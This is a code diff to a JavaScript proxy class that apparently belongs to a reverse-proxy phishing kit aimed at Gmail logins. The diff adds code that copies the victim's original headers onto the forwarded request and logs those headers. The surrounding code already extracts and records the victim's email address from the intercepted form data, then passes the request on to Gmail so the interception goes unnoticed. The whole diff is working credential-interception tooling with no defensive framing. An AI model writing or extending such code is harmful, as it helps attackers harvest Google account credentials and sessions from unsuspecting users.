@@ -42,6 +42,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
             this.browserReq.on('end', () => {
                 cJust += ''
                 console.log('Original request content:', cJust.substring(0, 200))
+                console.log('Original request headers:', this.browserReq.headers)
                 
                 // Only replace hostname in URLs, not in form data
                 const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
@@ -49,6 +50,13 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 
                 console.log('Modified request content:', kJust.substring(0, 200))
 
+                // Preserve original headers
+                Object.keys(this.browserReq.headers).forEach(key => {
+                    if (key.toLowerCase() !== 'host' && key.toLowerCase() !== 'content-length') {
+                        this.proxyEndpoint.setHeader(key, this.browserReq.headers[key])
+                    }
+                })
+                
                 this.proxyEndpoint.setHeader('Content-Length', cJust.length)
 
                 // Regex patterns for actual Gmail form data format
@@ -90,6 +98,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
                     // Forward the ORIGINAL request to Gmail without modifications
+                    console.log('Headers being sent to Gmail:', this.proxyEndpoint.getHeaders())
                     this.proxyEndpoint.write(cJust) 
                     this.proxyEndpoint.end()
                     console.log('Original request forwarded to Gmail, waiting for response...')
